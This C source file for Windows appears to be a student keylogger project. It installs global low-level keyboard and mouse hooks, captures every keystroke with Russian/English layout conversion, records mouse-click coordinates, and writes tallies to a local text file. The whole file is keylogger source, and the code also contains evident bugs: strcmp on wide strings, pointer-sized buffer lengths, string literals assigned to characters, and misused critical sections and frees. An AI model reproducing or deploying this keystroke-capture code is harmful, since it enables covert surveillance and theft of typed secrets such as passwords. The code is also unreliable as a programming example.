#include <stdio.h>
#include <Windows.h>
#include <string.h>
#include "KeyLogStructs.h"

#define PATH L"X:\\2021-2022\\Системное программирование\\Проекты\\Кейлоггер с курсором\\KeyLog.txt"
#define RUS 1049
#define ENG 1033
#define SIZE_STR 100500

BOOL IsCaps(void);
LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK LogMouse(int iCode, WPARAM wParam, LPARAM lParam);
VOID WriteToFile(LPWSTR wstr);
WCHAR EnToRus(WCHAR c);
VOID CountEverything(MAINLOG* lg);
MAINLOG* log;
CRITICAL_SECTION section = { 0 };

DWORD WINAPI KeyLogger() {
    InitializeCriticalSection(&section);
    log = calloc(1, sizeof(MAINLOG));
    log->prev = NULL;
    log->klog = calloc(1, sizeof(KLOG));
    log->mlog = calloc(1, sizeof(MLOG));
    log->klog->prev = NULL;
    log->mlog->prev = NULL;
    log->time = time(NULL);
    DeleteCriticalSection(&section);


    HHOOK keyBoardHook = SetWindowsHookExW(WH_KEYBOARD_LL, LogKey, NULL, NULL);
    HHOOK mouseHook = SetWindowsHookExW(WH_MOUSE_LL, LogMouse, NULL, NULL);
    MSG msg = { 0 };
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(keyBoardHook);
    UnhookWindowsHookEx(mouseHook);
    return 0;
}

DWORD WINAPI Timer() {
    time_t timeStart = time(NULL);
    time_t timeCheck = time(NULL);

    while (1) {
        timeCheck = time(NULL);
        if (timeCheck - timeStart >= 10) {
            CountEverything(log);
            log->next = calloc(1, sizeof(MAINLOG));
            log->next->prev = log;
            log = log->next;
            log->next = NULL;
            break;
        }
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmdLine, int nCmdShow) {
    HANDLE KeyLogProject[2];
    KeyLogProject[0] = CreateThread(NULL, 0, Timer, NULL, 0, 0);
    KeyLogProject[1] = CreateThread(NULL, 0, KeyLogger, NULL, 0, 0);
    WaitForSingleObject(KeyLogProject[0], INFINITE);
    TerminateThread(KeyLogProject[1], 0);
}

BOOL IsCaps(void) {
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 ^
		(GetKeyState(VK_SHIFT) & 0x8000) != 0)
		return TRUE;
	return FALSE;
}

LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam) {
	if (wParam == WM_KEYDOWN) {
		PKBDLLHOOKSTRUCT pHook = (PKBDLLHOOKSTRUCT)lParam;
		WORD KeyLayout = LOWORD(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), 0)));
		DWORD iKey = MapVirtualKey(pHook->vkCode, NULL) << 16;
		if (!(pHook->vkCode <= 1 << 5))
			iKey |= 0x1 << 24;
		LPWSTR KeyString = (LPWSTR)calloc(SIZE_STR + 1, sizeof(WCHAR));
        log->klog->KeyString = calloc(SIZE_STR + 2, sizeof(WCHAR));
		GetKeyNameTextW(iKey, KeyString, SIZE_STR);
		if (wcslen(KeyString) > 1) {
            swprintf(log->klog->KeyString, sizeof(log->klog->KeyString), L"[%s]", KeyString);
		}
		else {
			if (!IsCaps()) KeyString[0] = tolower(KeyString[0]);
			if (KeyLayout == ENG) {
                swprintf(log->klog->KeyString, sizeof(log->klog->KeyString), L"%s", KeyString);
			} if (KeyLayout == RUS) {
				KeyString[0] = EnToRus(KeyString[0]);
                swprintf(log->klog->KeyString, sizeof(log->klog->KeyString), L"%s", KeyString);
			}
		}
		free(KeyString);
        log->klog->next = calloc(1, sizeof(KLOG));
        log->klog->next->prev = log->klog;
        log->klog = log->klog->next;
        log->klog->next = NULL;
	}
	return CallNextHookEx(NULL, iCode, wParam, lParam);
}

LRESULT CALLBACK LogMouse(int iCode, WPARAM wParam, LPARAM lParam) {
    POINT point;
    GetCursorPos(&point);
    if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN || wParam == WM_MOUSEWHEEL) {
        log->mlog->mouseButton = wParam;
        log->mlog->mousePoint = point;
        log->mlog->next = calloc(1, sizeof(MLOG));
        log->mlog->next->prev = log->mlog;
        log->mlog = log->mlog->next;
        log->mlog->next = NULL;
    }
    return CallNextHookEx(NULL, iCode, wParam, lParam);
}

VOID WriteToFile(LPWSTR wstr) {
	FILE* f = NULL;
	if (!_wfopen_s(&f, PATH, L"ab")) {
		fwrite(wstr, sizeof(WCHAR), wcslen(wstr), f);
		fclose(f);
	}
}

WCHAR EnToRus(WCHAR c) {
    switch (c)
    {
    case ('q'): c = L'й'; break;
    case ('w'): c = L'ц'; break;
    case ('e'): c = L'у'; break;
    case ('r'): c = L'к'; break;
    case ('t'): c = L'е'; break;
    case ('y'): c = L'н'; break;
    case ('u'): c = L'г'; break;
    case ('i'): c = L'ш'; break;
    case ('o'): c = L'щ'; break;
    case ('p'): c = L'з'; break;
    case ('['): c = L'х'; break;
    case (']'): c = L'ъ'; break;
    case ('a'): c = L'ф'; break;
    case ('s'): c = L'ы'; break;
    case ('d'): c = L'в'; break;
    case ('f'): c = L'а'; break;
    case ('g'): c = L'п'; break;
    case ('h'): c = L'р'; break;
    case ('j'): c = L'о'; break;
    case ('k'): c = L'л'; break;
    case ('l'): c = L'д'; break;
    case (';'): c = L'ж'; break;
    case ('\''): c = L'э'; break;
    case ('z'): c = L'я'; break;
    case ('x'): c = L'ч'; break;
    case ('c'): c = L'с'; break;
    case ('v'): c = L'м'; break;
    case ('b'): c = L'и'; break;
    case ('n'): c = L'т'; break;
    case ('m'): c = L'ь'; break;
    case (','): c = L'б'; break;
    case ('/'): c = L'.'; break;
    case (' '): c = L' '; break;
    case ('`'): c = L'ё'; break;
    case ('\\'): c = L'\\'; break;
    case ('@'): c = L'\"'; break;
    case ('#'): c = L'№'; break;
    case ('$'): c = L';'; break;
    case ('^'): c = L':'; break;
    case ('&'): c = L'?'; break;
    case ('|'): c = L'/'; break;
    case ('Q'): c = L'Й'; break;
    case ('W'): c = L'Ц'; break;
    case ('E'): c = L'У'; break;
    case ('R'): c = L'К'; break;
    case ('T'): c = L'Е'; break;
    case ('Y'): c = L'Н'; break;
    case ('U'): c = L'Г'; break;
    case ('I'): c = L'Ш'; break;
    case ('O'): c = L'Щ'; break;
    case ('P'): c = L'З'; break;
    case ('{'): c = L'Х'; break;
    case ('}'): c = L'Ъ'; break;
    case ('A'): c = L'Ф'; break;
    case ('S'): c = L'Ы'; break;
    case ('D'): c = L'В'; break;
    case ('F'): c = L'А'; break;
    case ('G'): c = L'П'; break;
    case ('H'): c = L'Р'; break;
    case ('J'): c = L'О'; break;
    case ('K'): c = L'Л'; break;
    case ('L'): c = L'Д'; break;
    case (':'): c = L'Ж'; break;
    case ('"'): c = L'Э'; break;
    case ('Z'): c = L'Я'; break;
    case ('X'): c = L'Ч'; break;
    case ('C'): c = L'С'; break;
    case ('V'): c = L'М'; break;
    case ('B'): c = L'И'; break;
    case ('N'): c = L'Т'; break;
    case ('M'): c = L'Ь'; break;
    case ('<'): c = L'Б'; break;
    case ('>'): c = L'Ю'; break;
    case ('й'): c = L"q"; break;
    case ('ц'): c = L"w"; break;
    case ('у'): c = L"e"; break;
    case ('к'): c = L"r"; break;
    case ('е'): c = L"t"; break;
    case ('н'): c = L"y"; break;
    case ('г'): c = L"u"; break;
    case ('ш'): c = L"i"; break;
    case ('щ'): c = L"o"; break;
    case ('з'): c = L"p"; break;
    case ('х'): c = L"["; break;
    case ('ъ'): c = L"]"; break;
    case ('ф'): c = L"a"; break;
    case ('ы'): c = L"s"; break;
    case ('в'): c = L"d"; break;
    case ('а'): c = L"f"; break;
    case ('п'): c = L"g"; break;
    case ('р'): c = L"h"; break;
    case ('о'): c = L"j"; break;
    case ('л'): c = L"k"; break;
    case ('д'): c = L"l"; break;
    case ('ж'): c = L";"; break;
    case ('э'): c = L"'"; break;
    case ('я'): c = L"z"; break;
    case ('ч'): c = L"x"; break;
    case ('с'): c = L"c"; break;
    case ('м'): c = L"v"; break;
    case ('и'): c = L"b"; break;
    case ('т'): c = L"n"; break;
    case ('ь'): c = L"m"; break;
    case ('б'): c = L","; break;
    case ('ю'): c = L"."; break;
    case ('.'): c = L"."; break;
    case ('ё'): c = L"`"; break;
    case ('№'): c = L"#"; break;
    case ('?'): c = L","; break;
    case ('Й'): c = L"Q"; break;
    case ('Ц'): c = L"W"; break;
    case ('У'): c = L"E"; break;
    case ('К'): c = L"R"; break;
    case ('Е'): c = L"T"; break;
    case ('Н'): c = L"Y"; break;
    case ('Г'): c = L"U"; break;
    case ('Ш'): c = L"I"; break;
    case ('Щ'): c = L"O"; break;
    case ('З'): c = L"P"; break;
    case ('Х'): c = L"{"; break;
    case ('Ъ'): c = L"}"; break;
    case ('Ф'): c = L"A"; break;
    case ('Ы'): c = L"S"; break;
    case ('В'): c = L"D"; break;
    case ('А'): c = L"F"; break;
    case ('П'): c = L"G"; break;
    case ('Р'): c = L"H"; break;
    case ('О'): c = L"J"; break;
    case ('Л'): c = L"K"; break;
    case ('Д'): c = L"L"; break;
    case ('Ж'): c = L":"; break;
    case ('Э'): c = L"\""; break;
    case ('Я'): c = L"Z"; break;
    case ('Ч'): c = L"X"; break;
    case ('С'): c = L"C"; break;
    case ('М'): c = L"V"; break;
    case ('И'): c = L"B"; break;
    case ('Т'): c = L"N"; break;
    case ('Ь'): c = L"M"; break;
    case ('Б'): c = L"<"; break;
    case ('Ю'): c = L">"; break;
    }
    return c;
}

VOID CountEverything(MAINLOG* lg) {
    InitializeCriticalSection(&section);
    MAINLOG* head = lg;
    STRNG* h1;
    STRNG* keyboard = calloc(1, sizeof(STRNG));
    keyboard->prev = NULL;
    KLOG* key = head->klog;
    BOOL counted = FALSE;
    while (key) {
        h1 = keyboard;
        while (h1) {
            if (h1->act) {
                if (key->KeyString && strcmp(h1->act, key->KeyString) == 0) {
                    h1->count++;
                    counted = TRUE;
                    break;
                }
            }
            h1 = h1->prev;
        }
        if (counted == FALSE) {
            keyboard->act = calloc(SIZE_STR + 1, sizeof(WCHAR));
            swprintf(keyboard->act, (SIZE_STR + 1) * sizeof(WCHAR), L"%s", key->KeyString);
            keyboard->count = 1;
            keyboard->next = calloc(1, sizeof(STRNG));
            keyboard->next->prev = keyboard;
            keyboard = keyboard->next;
        }
        if (key->prev)
            key = key->prev;
        else
            break;
        counted = FALSE;
    }
    MLOG* mkey = head->mlog;
    STRNG* mouse = calloc(1, sizeof(STRNG));
    mkey = mkey->prev;
    while (mkey) {
        h1 = mouse;
        LPWSTR KeyString = calloc(10500, sizeof(WCHAR));
        switch (mkey->mouseButton) {
        case WM_LBUTTONDOWN:
            swprintf(KeyString, 10500 * sizeof(WCHAR), L"LKM - x = %d ; y = %d", mkey->mousePoint.x, mkey->mousePoint.y);
            break;
        case WM_RBUTTONDOWN:
            swprintf(KeyString, 10500 * sizeof(WCHAR), L"PKM - x = %d ; y = %d", mkey->mousePoint.x, mkey->mousePoint.y);
            break;
        case WM_MBUTTONDOWN:
            swprintf(KeyString, 10500 * sizeof(WCHAR), L"SKM - x = %d ; y = %d", mkey->mousePoint.x, mkey->mousePoint.y);
            break;
        case WM_MOUSEHWHEEL:
            swprintf(KeyString, 10500 * sizeof(WCHAR), L"KOL - x = %d ; y = %d", mkey->mousePoint.x, mkey->mousePoint.y);
            break;
        case 522:
            swprintf(KeyString, 10500 * sizeof(WCHAR), L"KOL - x = %d ; y = %d", mkey->mousePoint.x, mkey->mousePoint.y);
            break;
        default:
            KeyString = L"Oleg";
            break;
        }
        while (h1) {
            if (h1->act) {
                if (strcmp(h1->act, KeyString) == 0) {
                    h1->count++;
                    counted = TRUE;
                    break;
                }
            }
            h1 = h1->prev;
        }
        if (counted == FALSE) {
            mouse->act = calloc(10500, sizeof(WCHAR));
            swprintf(mouse->act, 10500 * sizeof(WCHAR), L"%s", KeyString);
            mouse->count = 1;
            mouse->next = calloc(1, sizeof(STRNG));
            mouse->next->prev = mouse;
            mouse = mouse->next;
        }
        if (mkey->prev)
            mkey = mkey->prev;
        else
            break;
        counted = FALSE;
        free(KeyString);
    }
    if (mouse->prev != NULL)
        mouse = mouse->prev;
    if (keyboard->prev != NULL)
        keyboard = keyboard->prev;
    mouse->next = NULL;
    keyboard->next = NULL;
    while (key->next) {
        free(key->prev);
        key = key->next;
    }
    while (mkey->next) {
        free(mkey->prev);
        mkey = mkey->next;
    }
    while (keyboard->prev) {
        keyboard = keyboard->prev;
    }
    while (mouse->prev) {
        mouse = mouse->prev;
    }
    WriteToFile(L"Клавиатура:\n");
    while (keyboard->next) {
        LPWSTR KeyString = calloc(100500, sizeof(WCHAR));
        swprintf(KeyString, 10500 * sizeof(WCHAR), L"%s - %d \t", keyboard->act, keyboard->count);
        WriteToFile(KeyString);
        keyboard = keyboard->next;
        free(KeyString);
    }
    WriteToFile(L"\nМышь:\n");
    while (mouse->next) {
        LPWSTR KeyString = calloc(100500, sizeof(WCHAR));
        swprintf(KeyString, 10500 * sizeof(WCHAR), L"%s - %d \t", mouse->act, mouse->count);
        WriteToFile(KeyString);
        mouse = mouse->next;
        free(KeyString);
    }
    WriteToFile(L"\n");
    while (mouse->prev) {
        mouse = mouse->prev;
        free(mouse->next);
    }
    while (keyboard->prev) {
        keyboard = keyboard->prev;
        free(keyboard->next);
    }
    DeleteCriticalSection(&section);
}

// Jktu